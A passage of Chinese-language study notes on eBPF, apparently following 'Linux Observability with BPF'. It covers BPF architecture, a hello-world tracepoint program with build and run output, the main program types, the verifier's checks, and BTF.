Linux内核还包含一个用于BPF指令的即时(JIT)编译器。JIT将在程序验证后直接将BPF字节码转换为机器码，避免了执行时间上的这种开销。这种架构的一个有趣的点是你不需要重新启动系统来加载BPF程序。 你可以按需加载它们，也可以编写自己的初始化脚本，在系统启动时加载BPF程序。</p><p>在内核运行任何BPF程序之前，它需要知道程序<code>attach</code>到了哪个执行点。内核有很多附着点，而且这个数量还在不断增加。当您选择一个执行点时，内核还提供了特定的函数助手，您可以使用它们来处理程序接收到的数据，从而使执行点和BPF程序紧密耦合。</p><p>BPF架构中最后的组件主要负责用户态和内核态之间的数据交换，这个组件叫做<code>BPF map</code>，<code>BPF map</code>是共享数据的双向结构，这意味着你可以从内核和用户空间的两侧写入和读取它们。<code>BPF map</code>有几种类型的结构，从简单的数组和<code>hash map</code>到专门的map，允许你将整个BPF程序保存在其中。</p><h3 id="结论"><a href="#结论" class="headerlink" title="结论"></a>结论</h3><p>我们写这本书是为了帮助你熟悉在日常使用这个Linux子系统时需要用到的基本BPF概念。 BPF仍然是一项正在发展的技术，在我们编写本书的过程中，新的概念和范式也在不断发展。 理想情况下，本书将为你提供BPF基础组件的坚实基础，从而帮助您轻松扩展知识。</p><p>下一章将直接深入BPF程序的结构以及内核如何运行它们。 它还涵盖了内核中可以<code>attach</code>这些程序的点。 这将帮助你熟悉程序可以使用的所有数据以及如何使用这些数据。</p><h2 id="第二章节"><a href="#第二章节" class="headerlink" title="第二章节"></a>第二章节</h2><h3 id="第一个BPF程序"><a href="#第一个BPF程序" class="headerlink" title="第一个BPF程序"></a>第一个BPF程序</h3><p>BPF虚拟机能够运行指令以响应内核触发的事件。然而，并不是所有的BPF程序都可以访问内核触发的所有事件。当你将一个程序加载到BPF虚拟机中时，你需要决定你正在运行哪种类型的程序。这会通知内核你的程序将被触发的位置。它还告诉BPF验证器在你的程序中将允许哪些助手。当你选择程序类型时，你也在选择程序正在实现的接口。 该接口确保你可以访问适当类型的数据，以及你的程序是否可以直接访问网络数据包。</p><p>多年来，内核开发人员一直在添加不同的入口点，你可以将 BPF 程序<code>attach</code>到这些入口点。 这项工作还没有完成，他们每天都在寻找利用BPF的新方法。 在本章中，我们将重点介绍一些最有用的程序类型，目的是让你了解使用BPF可以做什么。 我们将在以后的章节中讨论如何编写BPF程序的许多其他示例。</p><p>本章还将介绍BPF验证器在运行程序中所扮演的角色。 该组件验证你的代码是否可以安全执行，并帮助你编写不会导致意外结果的程序，例如内存耗尽或内核突然崩溃。 </p><h3 id="编写BPF程序"><a href="#编写BPF程序" class="headerlink" title="编写BPF程序"></a>编写BPF程序</h3><p>编写BPF程序的最常见方法是使用<code>LLVM</code>编译的C语言子集。<code>LLVM</code>是一种通用编译器，可以输出不同类型的字节码。在这种情况下，<code>LLVM</code>将输出BPF汇编代码，之后我们会将代码加载到内核中。我们会在以后的章节中展示 BPF汇编的简短示例，编写汇编比C语言更合适，例如<code>Seccomp</code>过滤器来控制内核中的传入系统调用。内核提供系统调用bpf来在程序编译后将它们加载到BPF虚拟机中。 该系统调用用于加载程序之外的其他操作，你将在后面的章节中看到更多使用示例。 内核还提供了一些实用工具，可以为你抽象BPF程序的加载。在第一个代码示例中，我们将展示BPF的“Hello World”示例</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/bpf.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SEC(NAME) __attribute__((section(NAME), used))</span></span><br><span class="line"></span><br><span class="line">SEC(<span class="string">"tracepoint/syscalls/sys_enter_execve"</span>)</span><br><span class="line">  <span class="function"><span class="keyword">int</span> <span class="title">bpf_prog</span><span class="params">(<span class="keyword">void</span> *ctx)</span> </span>&#123;</span><br><span class="line"><span class="keyword">char</span> msg[] = <span class="string">"Hello, BPF World!"</span>; </span><br><span class="line">  bpf_trace_printk(msg, <span class="keyword">sizeof</span>(msg)); </span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">char</span> _license[] SEC(<span class="string">"license"</span>) = <span class="string">"GPL"</span>;</span><br></pre></td></tr></table></figure><p>在上面的程序中有一些简单的概念。当我们想要运行这个程序时，我们使用属性<code>SEC</code>来通知BPF虚拟机。在上面BPF例子中，当检测到<code>execve</code>系统调用中的跟踪点时，我们将运行这个BPF程序。跟踪点是内核二进制代码中的静态标记，允许开发人员注入代码来检查内核的执行。所以我们将看到消息<code>Hello，BPF World！</code>每当内核检测到一个程序执行另一个程序时。</p><p>在这个例子的最后，我们还指定了这个程序的许可证。因为Linux内核是在GPL下获得许可的，所以它也只能加载获得GPL许可的程序。 如果我们将许可证设置为其他内容，内核将拒绝加载我们的程序。我们正在使用    <code>bpf_trace_printk</code>在内核跟踪日志中打印一条消息； 该消息你可以在<code>/sys/kernel/debug/tracing/trace_pipe</code>路径下找到此日志。</p><p>我们将使用<code>Clang</code>将第一个程序编译为有效的ELF二进制文件。这是内核期望加载的格式。我们将把我们的第一个程序保存在一个名为<code>bpf_program.c</code>的文件中，以便编译它：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">clang -O2 -target bpf -c bpf_program.c -o bpf_program.o</span><br></pre></td></tr></table></figure><p>在这里编译的时候遇到了一个错误。具体报错如下</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">bpf_program.c:7:3: warning: implicit declaration of function 'bpf_trace_printk' is invalid in C99 [-Wimplicit-function-declaration]</span><br><span class="line">  bpf_trace_printk(msg, sizeof(msg)); </span><br><span class="line">  ^</span><br><span class="line">1 warning generated.</span><br></pre></td></tr></table></figure><p>解决方法：<a href="https://github.com/iovisor/gobpf/issues/267" target="_blank" rel="noopener">https://github.com/iovisor/gobpf/issues/267</a></p><p>重新编译得到<code>bpf_program.o</code>文件</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">clang -O2 -target bpf -c bpf_program.c -I bpf_helpers.h -o bpf_program.o</span><br></pre></td></tr></table></figure><p>现在我们已经编译了第一个BPF程序，需要将它加载到内核中。我们使用内核提供的特殊帮助器来抽象编译和加载程序。这个帮助程序称为<code>load_bpf_file</code>，它需要一个二进制文件并尝试将其加载到内核中。程序代码如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;uapi/linux/bpf.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"bpf_load.h"</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv)</span> </span>&#123;</span><br><span class="line"><span class="keyword">if</span> (load_bpf_file(<span class="string">"bpf_program.o"</span>) != <span class="number">0</span>) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"The kernel didn't load the BPF program\n"</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>; </span><br><span class="line">&#125;</span><br><span class="line">read_trace_pipe(); </span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们将使用脚本来编译该程序并将其链接为ELF二进制文件。 在这种情况下，我们不需要指定目标，因为该程序不会加载到BPF虚拟机中。 我们需要使用一个外部库，并且编写一个脚本可以更容易地将它们放在一起。</p><p>具体的执行流程如下链接所示</p><p><a href="https://github.com/bpftools/linux-observability-with-bpf/tree/master/code/chapter-2/hello_world" target="_blank" rel="noopener">https://github.com/bpftools/linux-observability-with-bpf/tree/master/code/chapter-2/hello_world</a></p><p>这里需要注意在Makefile中需要将<code>kernel-src</code>修改为你的内核源代码路径</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[root@VM-16-14-centos bpf]# make bpfload</span><br><span class="line">clang -O2 -target bpf -c bpf_program.c -I/root/linux-5.4/tools/testing/selftests/bpf -o bpf_program.o</span><br><span class="line">clang -DHAVE_ATTR_TEST=0 -o monitor-exec -lelf -I/root/linux-5.4/samples/bpf -I/root/linux-5.4/tools/lib -I/root/linux-5.4/tools/perf -I/root/linux-5.4/tools/include -L/usr/local/lib64 -lbpf \</span><br><span class="line">        /root/linux-5.4/samples/bpf/bpf_load.c loader.c</span><br><span class="line">[root@VM-16-14-centos bpf]# ls</span><br><span class="line">Makefile  bpf_helpers.h  bpf_program.c  bpf_program.o  loader.c  monitor-exec</span><br></pre></td></tr></table></figure><p>当你运行这个程序时，你会开始看到我们的Hello, BPF World！ 几秒钟后的消息，即使您没有对计算机执行任何操作。 这是因为在您的计算机后台运行的程序可能正在执行其他调用了<code>execve</code>的程序。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">[root@VM-16-14-centos bpf]# ./monitor-exec </span><br><span class="line">     barad_agent-20064   [000] d..31  7270.907178: bpf_trace_printk: Hello, BPF World!</span><br><span class="line"></span><br><span class="line">              sh-20067   [000] d..31  7270.909399: bpf_trace_printk: Hello, BPF World!</span><br><span class="line"></span><br><span class="line">              sh-20066   [000] d..31  7270.910152: bpf_trace_printk: Hello, BPF World!</span><br><span class="line"></span><br><span class="line">              sh-20065   [000] d..31  7270.912163: bpf_trace_printk: Hello, BPF World!</span><br><span class="line"></span><br><span class="line">     barad_agent-20069   [000] d..31  7273.905863: bpf_trace_printk: Hello, BPF World!</span><br><span class="line"></span><br><span class="line">              sh-20069   [000] d..31  7273.907699: bpf_trace_printk: Hello, BPF World!</span><br><span class="line"></span><br><span class="line">     barad_agent-20070   [000] d..31  7273.909361: bpf_trace_printk: Hello, BPF World!</span><br><span class="line"></span><br><span class="line">              sh-20072   [000] d..31  7273.911010: bpf_trace_printk: Hello, BPF World!</span><br><span class="line"></span><br><span class="line">              sh-20071   [000] d..31  7273.912147: bpf_trace_printk: Hello, BPF World!</span><br></pre></td></tr></table></figure><p>当您停止此程序时，该消息将停止显示在您的终端中。 一旦加载 BPF 程序的程序终止，BPF 程序就会从虚拟机中卸载。在接下来的章节中，我们将探讨如何使BPF程序持久化，即使它们的加载器终止之后，因为在许多情况下，我们会希望BPF程序在后台运行，从系统中收集数据，而不管其他进程是否正在运行。现在我们已经了解了BPF程序的基本结构，接下来可以深入了解我们能够编写哪些类型的程序，从而使得我们能够访问Linux内核中的不同子系统。</p><h3 id="BPF程序类型"><a href="#BPF程序类型" class="headerlink" title="BPF程序类型"></a>BPF程序类型</h3><p>尽管程序中没有明确的分类，但我们可以将所有类型分为两类，具体取决于它们的主要用途。</p><p>第一类是追踪(tracing)。 编写的程序会帮助你更好地了解系统中正在发生的事情。它们为你提供有关系统行为及其运行的硬件的直接信息。 它们可以访问与特定程序相关的内存区域，并从正在运行的进程中提取执行跟踪信息。 它们还使你可以直接访问为每个特定进程分配的资源，从文件描述符到CPU和内存的使用情况。</p><p>第二类是网络(networking)。 这些类型的程序允许你检查和操作系统中的网络流量。它们让你过滤来自网络接口的数据包，甚至完全拒绝这些数据包。不同类型的程序可以附着(attach)到内核内网络处理的不同阶段。 这有优点也有缺点。例如，你可以在网络驱动程序接收到数据包后立即将BPF程序附着到网络事件，但是该程序将访问的有关数据包的信息较少，因为内核还没有足够的信息来提供给你。另一方面，您可以在 BPF 程序被传递到用户空间之前立即将它们附加到网络事件。 在这种情况下，你可以获得有关数据包的更多信息，这会帮助你做出更好的决策，但是这样处理成本较高。</p><p>我们接下来展示的程序类型没有分类。我们按照它们被添加到内核的时间顺序来介绍这些类型。 </p><h4 id="Socket-Filter程序"><a href="#Socket-Filter程序" class="headerlink" title="Socket Filter程序"></a>Socket Filter程序</h4><p><code>BPF_PROG_TYPE_SOCKET_FILTER</code>是第一个添加到Linux内核的程序类型。当BPF程序附着到原始套接字时，你可以访问该套接字处理的所有数据包。套接字过滤程序不允许修改这些数据包的内容或更改这些数据包的目的地，它们仅允许你出于可观察性目的访问它们。你的程序接收的元数据包含与网络堆栈相关的信息，例如用于传递数据包的协议类型等。</p><h4 id="Kprobe程序"><a href="#Kprobe程序" class="headerlink" title="Kprobe程序"></a>Kprobe程序</h4><p><code>kprobes</code>是可以动态附加到内核中某些调用点的函数。<code>BPF kprobe</code>程序类型允许你将BPF程序用作<code>kprobe</code>处理程序。 它们使用<code>BPF_PROG_TYPE_KPROBE</code>类型定义。BPF虚拟机确保<code>kprobe</code>程序始终可以安全运行，这是传统<code>kprobe</code>模块的优势。 这里需要强调的是，<code>kprobe</code>不是内核中的稳定入口点，所以你需要确保<code>kprobe BPF</code>程序与你正在使用的特定内核版本兼容。</p><p>当你编写一个附着到<code>kprobe</code>的BPF程序时，你需要决定它是作为函数调用中的第一条指令执行还是在调用完成时执行。你需要在BPF程序的节头中声明此行为。例如，如果你想在内核调用<code>exec</code>系统调用时检查参数，你将在调用开始时附加程序，这个时候需要在头部添加<code>SEC(&quot;kprobe/sys_exec&quot;)</code>。如果要检查调用<code>exec</code>系统调用的返回值，则需要在头部添加<code>SEC(&quot;kretprobe/sys_exec&quot;)</code>。</p><h4 id="Tracepoint程序"><a href="#Tracepoint程序" class="headerlink" title="Tracepoint程序"></a>Tracepoint程序</h4><p>这种类型的程序允许将BPF程序附着到内核提供的跟踪点处理程序。跟踪点程序使用<code>BPF_PROG_TYPE_TRACEPOINT</code>类型定义。跟踪点是内核代码库中的静态标记，允许注入任意代码进行跟踪和调试。它们不如<code>kprobes</code>灵活，因为它们需要事先由内核定义，但在引入内核后就是稳定的。 当你想要调试系统时，这种方法提供了更高级别的可预测性。</p><p>系统中的所有跟踪点都定义在目录<code>/sys/kernel/debug/tracing/events</code>中。在该目录下，每个子系统都包含任何跟踪点，并且可以将BPF程序附着到这些子系统。BPF跟踪点在<code>/sys/kernel/debug/tracing/events/bpf</code>中定义。 例如，可以在此处找到<code>bpf_prog_load</code>的跟踪点定义。 这意味着你可以编写一个BPF程序来检查其他BPF程序何时加载。</p><h4 id="XDP程序"><a href="#XDP程序" class="headerlink" title="XDP程序"></a>XDP程序</h4><p>XDP程序允许你编写在网络数据包到达内核时就执行的代码。 它们使用<code>BPF_PROG_TYPE_XDP</code>类型定义。 鉴于内核没有太多时间来处理信息本身，它只从数据包中公开一组有限的信息。 因为数据包是在早期执行的，所以你对如何处理该数据包有更高级别的控制。</p><p>XDP程序定义了几个可以控制的操作，并允许你决定如何处理该数据包。你可以从你的XDP程序中返回<code>XDP_PASS</code>，这意味着数据包应该被传递到内核中的下一个子系统。你还可以返回<code>XDP_DROP</code>，这意味着内核应该完全忽略此数据包，并且不对其进行任何其他操作。你还可以返回<code>XDP_TX</code>，这意味着数据包应该被转发回最初接收数据包的网卡接口(NIC)。</p><p>这种级别的控制使得网络层的处理更加灵活，XDP也已经成为BPF中的主要组件之一。在后续章节中，我们还会讨论XDP许多强大之处，例如保护你的网络免受分布式拒绝服务(DDoS)攻击。</p><h4 id="Perf-Event程序"><a href="#Perf-Event程序" class="headerlink" title="Perf Event程序"></a>Perf Event程序</h4><p>这些类型的BPF程序允许你将BPF代码附着到<code>Perf events</code>。它们使用<code>BPF_PROG_TYPE_PERF_EVENT</code>类型定义。<code>Perf</code>是内核中的一个内部分析器，它为硬件和软件发出性能数据事件。你可以使用它来监控许多事物，从计算机的CPU到系统上运行的任何软件。当你将BPF程序附着到<code>Perf events</code>时，你的代码将在每次<code>Perf</code>生成数据时执行。</p><h4 id="Cgroup-Socket程序"><a href="#Cgroup-Socket程序" class="headerlink" title="Cgroup Socket程序"></a>Cgroup Socket程序</h4><p>这些类型的程序允许你将BPF处理逻辑附着到控制组(cgroups)。它们使用<code>BPF_PROG_TYPE_CGROUP_SKB</code>类型定义。它们允许<code>cgroup</code>控制它们包含的进程内的网络流量。使用这些程序可以在将网络数据包交付<code>cgroup</code>中的进程之前决定如何处理它。内核尝试传递给同一<code>cgroup</code>中的任何进程的任何数据包都将通过这些过滤器之一。 同时，你可以决定当<code>cgroup</code>中的进程通过该接口发送网络数据包时要做什么。</p><p>你会发现，这些行为类似于<code>BPF_PROG_TYPE_SOCKET_FILTER</code>程序。 主要区别在于<code>BPF_PROG_TYPE_CGROUP_SKB</code>程序附着到一个<code>cgroup</code>内的所有进程，而不是特定进程；这种行为适用于在给定<code>cgroup</code>中创建的当前和以后的套接字。附着到<code>cgroup</code>的BPF程序在容器环境中非常有用，在这些环境下，进程组受<code>cgroup</code>约束，因此你可以将相同的策略应用于所有进程，而无需单独识别每个进程。<code>Cilium</code>是一个流行的开源项目，它为<code>Kubernetes</code>提供负载均衡和安全功能，在<code>cilium</code>中，广泛使用<code>cgroup</code>套接字程序将其策略应用于组而不是孤立的容器中。</p><h4 id="Cgroup-Open-Socket程序"><a href="#Cgroup-Open-Socket程序" class="headerlink" title="Cgroup Open Socket程序"></a>Cgroup Open Socket程序</h4><p>这些类型的程序允许你在<code>cgroup</code>中的任何进程打开网络套接字时执行代码。这种行为类似于附着到<code>cgroup</code>套接字缓冲区的程序，但不是让你在数据包通过网络时访问它们，而是允许你控制进程打开新套接字时发生的情况。它们使用<code>BPF_PROG_TYPE_CGROUP_SOCK</code>类型定义。 这对于可以打开套接字的程序组提供安全性和访问控制很有用，因为这样不必单独限制每个进程的功能。</p><h4 id="Socket-Option程序"><a href="#Socket-Option程序" class="headerlink" title="Socket Option程序"></a>Socket Option程序</h4><p>这些类型的程序允许你在运行时修改套接字连接选项，当数据包通过内核网络堆栈中的多个阶段时。它们附着到<code>cgroup</code>上，很像<code>BPF_PROG_TYPE_CGROUP_SOCK</code>和<code>BPF_PROG_TYPE_CGROUP_SKB</code>，但与那些程序类型不同的是，它们可以在连接的生命周期内多次调用。 该程序使用<code>BPF_PROG_TYPE_SOCK_OPS</code>类型定义。</p><p>当你创建一个这种类型的BPF程序时，你的函数调用会收到一个名为<code>op</code>的参数，它表示内核将要通过套接字连接执行的操作，因此，你就会知道程序在连接生命周期中的哪个时间点被调用。有了这些信息，你就可以访问网络IP地址和连接端口等数据，还可以修改连接选项以设置超时并更改给定数据包的往返延迟时间。</p><p>举个例子，<code>Facebook</code>使用它来为同一数据中心内的连接设置较短的设置重传超时(RTO)。RTO是系统在网络连接预计发生故障后恢复的时间。这个目标也代表了系统在遭受不可连接的情况下无法使用的时间。 在<code>Facebook</code>的案例中，它假设同一数据中心中的机器应该具有较短的RTO，并且使用 BPF 程序修改了这个阈值。</p><h4 id="Socket-Map程序"><a href="#Socket-Map程序" class="headerlink" title="Socket Map程序"></a>Socket Map程序</h4><p><code>BPF_PROG_TYPE_SK_SKB</code>程序让你可以访问套接字映射和套接字重定向。 套接字映射允许你保留对多个套接字的引用。当你有这些引用时，你可以使用特殊的帮助器将传入的数据包从一个套接字重定向到另一个套接字。当你想使用BPF实现负载均衡功能时，可以通过跟踪多个套接字在它们之间转发网络数据包，而无需离开内核空间。<code>Cillium</code>和<code>Facebook</code>的<code>Katran</code>等项目广泛使用这些类型的程序来控制网络流量。</p><h4 id="Cgroup-Device程序"><a href="#Cgroup-Device程序" class="headerlink" title="Cgroup Device程序"></a>Cgroup Device程序</h4><p>这种类型的程序允许你决定是否可以为给定设备执行<code>cgroup</code>中的操作。这些程序使用<code>BPF_PROG_TYPE_CGROUP_DEVICE</code>类型定义。 <code>cgroups (v1)</code>的第一个实现允许你为特定设备设置权限，然而，<code>cgroups（v2）</code> 缺少这个特性。引入这种类型的程序是为了提供该功能。同时，能够编写BPF程序可以让你在需要时更灵活地设置这些权限。</p><h4 id="Socket-Message-Delivery程序"><a href="#Socket-Message-Delivery程序" class="headerlink" title="Socket Message Delivery程序"></a>Socket Message Delivery程序</h4><p>这些类型的程序可以控制是否应该传递发送到套接字的消息。它们使用<code>BPF_PROG_TYPE_SK_MSG</code>类型定义。当内核创建<code>socket</code>时，它会将<code>socket</code>存储在<code>socket map</code>中。该<code>map</code>使内核可以快速访问特定的<code>socket</code>组。当你将套接字消息的BPF程序附着到<code>socket map</code>时，发送到这些<code>socket</code>的所有消息都将在传递它们之前被程序过滤。在过滤消息之前，内核会复制消息中的数据，以便可以处理它。这些程序有两个返回值：<code>SK_PASS</code>和<code>SK_DROP</code>。 如果你希望内核将消息发送到<code>socket</code>，则使用第一个，如果你希望内核忽略该消息，则使用后一个。</p><h4 id="RAW-Tracepoint程序"><a href="#RAW-Tracepoint程序" class="headerlink" title="RAW Tracepoint程序"></a>RAW Tracepoint程序</h4><p>我们之前谈到了一种访问内核中跟踪点的程序。内核开发人员添加了一个新的跟踪点程序来解决访问内核保存的原始格式的跟踪点参数。这种格式让你可以访问有关内核正在执行的任务的更详细信息，但是，它的性能开销很小。 大多数情况下你会希望在程序中使用常规跟踪点来避免这种性能开销，你也可以在需要时使用原始跟踪点访问原始参数。这些类型的程序被定义为<code>BPF_PROG_TYPE_RAW_TRACE POINT</code></p><h4 id="Cgroup-Socket-Address程序"><a href="#Cgroup-Socket-Address程序" class="headerlink" title="Cgroup Socket Address程序"></a>Cgroup Socket Address程序</h4><p>当用户空间程序由特定的<code>cgroup</code>控制时，这种类型的程序允许你操作用户空间程序所附加的IP地址和端口号。 当你希望确保一组特定的用户空间程序使用相同的IP地址和端口时，你的系统会使用多个IP地址。当你将这些用户空间程序放在同一个<code>cgroup</code>中时，这些BPF程序使你可以灵活地操作这些绑定。这确保了来自这些应用程序的所有传入和传出连接都使用BPF程序提供的IP和端口。这些程序类型定义为<code>BPF_PROG_TYPE_CGROUP_SOCK_ADDR</code></p><h4 id="Socket-Reuseport程序"><a href="#Socket-Reuseport程序" class="headerlink" title="Socket Reuseport程序"></a>Socket Reuseport程序</h4><p><code>SO_REUSEPORT</code>是内核中的一个选项，它允许同一主机中的多个进程绑定到同一端口。 当你想要跨多个线程分配负载时，此选项允许在接受的网络连接中获得更高的性能。<code>BPF_PROG_TYPE_SK_REUSEPORT</code>程序类型允许你编写<code>BPF</code>程序<code>hook</code>到内核来决定是否重用端口。如果你的BPF程序返回<code>SK_DROP</code>，你可以阻止程序重用同一个端口。当BPF程序返回<code>SK_PASS</code>时，你可以通知内核使用它自己的重用例程。</p><h4 id="Flow-Dissection程序"><a href="#Flow-Dissection程序" class="headerlink" title="Flow Dissection程序"></a>Flow Dissection程序</h4><p>流解析器是内核的一个组件，它跟踪网络数据包需要通过的不同层，从到达系统到交付到用户空间程序。 它允许你使用不同的分类方法来控制数据包的流动。内核中内置的解析器称为<code>Flower</code>分类器，防火墙和其他过滤设备使用它来决定如何处理特定的数据包。</p><p><code>BPF_PROG_TYPE_FLOW_DISSECTOR</code>程序旨在<code>hook</code>流解析器路径中的逻辑。 它们提供了内置解析器无法提供的安全保证，例如确保程序始终终止，这在内置解析器中可能无法保证。 这些BPF程序可以修改网络数据包在内核中所遵循的流。</p><h4 id="Other-BPF程序"><a href="#Other-BPF程序" class="headerlink" title="Other BPF程序"></a>Other BPF程序</h4><p>我们已经讨论了在不同环境中使用的程序类型，但还有一些其他的BPF程序类型我们还没有涉及。 在这里仅简要提及</p><ul><li><p>Traffic classifier程序</p><p><code>BPF_PROG_TYPE_SCHED_CLS</code>和<code>BPF_PROG_TYPE_SCHED_ACT</code>是两种类型的BPF程序，它们允许对网络流量进行分类并修改套接字缓冲区中数据包的某些属性。</p></li><li><p>Lightweight tunnel程序</p><p><code>BPF_PROG_TYPE_LWT_IN、BPF_PROG_TYPE_LWT_OUT、BPF_PROG_TYPE_LWT_XMIT 和 BPF_PROG_TYPE_LWT_SEG6LOCAL</code>是允许将代码附着到内核的轻量级隧道基础设施的BPF程序类型。</p></li><li><p>Infrared device程序</p><p><code>BPF_PROG_TYPE_LIRC_MODE2</code>程序允许通过连接到红外设备（例如遥控器）来附着BPF程序。</p></li></ul><p>以上这些程序是专门的，它们的使用尚未被社区广泛采用。</p><p>接下来，我们将讨论BPF如何确保你的程序在内核加载它们后不会导致系统发生灾难性故障。</p><h3 id="BPF校验器"><a href="#BPF校验器" class="headerlink" title="BPF校验器"></a>BPF校验器</h3><p>允许任何人在Linux内核中执行任何代码乍一听是一件很疯狂的事情。如果没有BPF验证器，在生产系统中运行BPF程序的风险会太高。用内核网络维护者之一<code>Dave S. Miller</code>的话来说，“唯一介于eBPF程序和一个黑暗破坏鸿沟之间的是eBPF验证器。”</p><p>显然，BPF验证器也是一个运行在系统上的程序，它能够仔细审查以确保正确完成它的工作。在过去几年中，安全研究人员在验证程序中发现了一些漏洞，这些漏洞允许攻击者访问内核中的随机内存，即使是非特权用户。你可以在CVE目录中阅读有关此类漏洞的更多信息。 例如，<code>CVE-2017-16995</code>描述了任何用户如何读写内核内存并绕过BPF验证程序。</p><p>验证程序执行的第一个检查是对虚拟机将要加载的代码的静态分析。 第一次检查的目的是确保程序有预期的结束。为此，验证器使用代码创建有向无环图 (DAG)。验证器分析的每条指令都成为图中的一个节点，每个节点都链接到下一条指令。验证器生成此图后，会执行深度优先搜索(DFS)，以确保程序完成并且代码不包含危险路径。 这意味着它将遍历图的每个分支，一直到分支的底部，以保证没有递归循环。</p><p>以下是验证器在第一次检查期间的一些条件：</p><ul><li>程序不包括控制循环。为了确保程序不会陷入无限循环，验证器拒绝任何类型的控制循环。已经有人提议在 BPF 程序中允许循环，但在撰写本文时，还没有一个被采用。</li><li>程序不会尝试执行超过内核允许的最大值的指令。此时，要执行的最大指令数为4096。这个限制是为了防止BPF永远运行。</li><li>程序不包含任何无法访问的指令，例如从未执行的条件或函数。这可以防止在虚拟机中加载死代码，这也会延迟BPF程序的终止。</li><li>程序不会试图跳出它的界限。</li></ul><p>验证器执行的第二项检查是BPF程序的试运行。 这意味着验证器将尝试分析程序将要执行的每条指令，以确保它不会执行任何无效指令。此次执行还检查所有内存指针是否被正确访问和取消引用。最后，试运行会通知验证器程序中的控制流，以确保无论程序采用哪条控制路径，它都到达<code>BPF_EXIT</code>指令。为此，验证器会跟踪堆栈中所有访问过的分支路径，并在采用新路径之前对其进行评估，以确保它不会多次访问特定路径。在这两项检查通过后，验证器认为程序是可以安全执行的。</p><p>如果你对如何分析程序感兴趣，bpf系统调用允许你进行调试验证程序的检查。 当你使用此系统调用加载程序时，可以设置几个属性，使验证程序打印其操作日志：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">union</span> bpf_attr attr = &#123; </span><br><span class="line">  .prog_type = type,</span><br><span class="line">.insns = ptr_to_u64(insns), </span><br><span class="line">  .insn_cnt = insn_cnt,</span><br><span class="line">.license =ptr_to_u64(license), </span><br><span class="line">  .log_buf =ptr_to_u64(bpf_log_buf), </span><br><span class="line">  .log_size = LOG_BUF_SIZE, </span><br><span class="line">  .log_level = <span class="number">1</span>,</span><br><span class="line">&#125;;</span><br><span class="line">bpf(BPF_PROG_LOAD, &amp;attr, <span class="keyword">sizeof</span>(attr));</span><br></pre></td></tr></table></figure><p><code>log_level</code>字段告诉验证器是否打印任何日志。设置为1时会打印其日志，设置为0时不会打印任何内容。如果要打印验证器日志，还需要提供日志缓冲区及其大小。这个缓冲区是一个多行字符串，你可以打印它来检查验证器所做出的决定。</p><p>下一节将介绍BPF如何在内存中构造程序信息。程序的结构方式将有助于弄清楚如何访问BPF内部，帮助你更好的调试和理解程序的行为方式。</p><h3 id="BPF类型格式"><a href="#BPF类型格式" class="headerlink" title="BPF类型格式"></a>BPF类型格式</h3><p>BPF类型格式(BTF)是元数据结构的集合，可增强BPF 程序、映射和函数的调试信息。BTF包含源信息，因此我们在后续所讨论的<code>BPFTool</code>等工具可以向你展示对BPF数据的更丰富的解释。这些元数据存储在二进制程序中一个特殊的“.BFT”元数据部分下。BTF信息有助于使你的程序更易于调试，但它会显著增加二进制文件的大小，因为它需要跟踪程序中声明的所有内容的类型信息。BPF验证器也使用此信息来确保你的程序定义的结构类型是正确的。</p><p>BTF专门用于注释C语言类型。 像<code>LLVM</code>这样的BPF编译器知道如何为你包含这些信息，因此你无需完成将这些信息添加到每个结构的繁琐任务。然而，在某些情况下，工具链仍然需要一些注释来增强程序。在后续章节，我们将描述这些注释是如何发挥作用的，以及像<code>BPFTool</code>这样的工具是如何显示这些信息的。</p><h3 